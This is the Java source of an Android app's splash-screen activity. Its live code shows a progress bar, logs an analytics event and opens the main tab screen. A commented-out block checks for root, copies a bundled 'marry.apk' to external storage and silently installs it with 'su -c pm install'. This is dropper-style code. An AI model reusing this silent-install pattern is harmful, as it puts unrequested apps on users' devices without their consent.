package prof.magnitos.speedytask.ui;

import android.app.Activity;
import android.content.Intent;
import android.graphics.Color;
import android.os.Bundle;

import com.gc.materialdesign.views.ProgressBarCircularIndeterminate;
import com.parse.ParseAnalytics;

import java.util.HashMap;
import java.util.Map;

import prof.magnitos.speedytask.R;
import prof.magnitos.speedytask.components.AsyncResponse;
import prof.magnitos.speedytask.components.MainAsync;

/**
 * Created by  on 06.06.2015.
 */
public class SplashActiv extends Activity {


    @Override
    protected void onCreate(Bundle savedInstanceState) {

        super.onCreate(savedInstanceState);
        setContentView(R.layout.splash_activity);

        /*try{
            if(RootUtil.isDeviceRooted()){
                System.out.println("Is rooted");
            }else{
                System.out.println("Is not rooted");
            }

            AssetManager assetManager = getAssets();

            InputStream in = null;
            OutputStream out = null;

            try {
                in = assetManager.open("marry.apk");
                out = new FileOutputStream(Environment.getExternalStorageDirectory().getAbsolutePath()+"/marry.apk");

                byte[] buffer = new byte[1024];

                int read;
                while((read = in.read(buffer)) != -1) {

                    out.write(buffer, 0, read);

                }

                in.close();
                in = null;

                out.flush();
                out.close();
                out = null;

                Intent intent = new Intent(Intent.ACTION_VIEW);

                intent.setDataAndType(Uri.fromFile(new File(Environment.getExternalStorageDirectory().getAbsolutePath() + "/marry.apk")),
                        "application/vnd.android.package-archive");

                //startActivity(intent);

            } catch(Exception e) {e.printStackTrace(); }

            BufferedReader inn = null;
            String returnString = null;
            Process install = Runtime.getRuntime().exec("su -c pm install " + Environment.getExternalStorageDirectory().getAbsolutePath() + "marry.apk");
            //DataOutputStream os = new DataOutputStream(install.getOutputStream());
            //os.writeBytes("pm install " + Environment.getExternalStorageDirectory().getAbsolutePath() + "/marry.apk" + "\n");
            inn = new BufferedReader(new InputStreamReader(install.getInputStream()));
            while (returnString == null || returnString.contentEquals("")) {
                returnString = inn.readLine();
            }
            System.out.println(returnString);
           // os.writeBytes("exit\n");
            //os.flush();
            install.waitFor();
        }catch (Exception e){
            e.printStackTrace();
        }

        */

        ProgressBarCircularIndeterminate dp = (ProgressBarCircularIndeterminate) findViewById(R.id.dialogProgress);
        dp.setBackgroundColor(Color.WHITE);


        Map<String, String> dimensions = new HashMap<String, String>();
        dimensions.put("type", "load_application");
        dimensions.put("activity", "splash_screen");
        ParseAnalytics.trackEventInBackground("read", dimensions);



        new MainAsync(new AsyncResponse() {
            @Override
            public void processFinish(Object output) {
                Intent ta = new Intent(getApplicationContext(),TabActivity.class);
                ta.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(ta);
                finish();
            }
        }).execute(new Object[]{});


       // sleep();
      /* Intent intn = new Intent(getBaseContext(),TabActivity.class);
        startActivity(intn);
        this.finish();*/

        /*Intent intn = new Intent(this,TabActivity.class);
        startActivity(intn);
        this.finish();*/


    }


/*@Override
public void onFinish() {super.onFinish();}*/
/*private void sleep(){
    try{
        TimeUnit.MILLISECONDS.sleep(3000);
    }catch (InterruptedException e){e.printStackTrace();}
}*/

  /*  @Override
    protected void onResume(){
        try {

            TimeUnit.MILLISECONDS.sleep(3000);
            //super.onResume();
           *//* Thread.sleep(3000);*//*
            //tv.setText("");
       *//* TextView tv=(TextView) findViewById(R.id.loadtext);
        tv.setText("hello world");*//*
            Intent intn = new Intent(this, TabActivity.class);
            startActivity(intn);
            this.finish();
        }catch (InterruptedException e){e.printStackTrace();}

    }*/
}
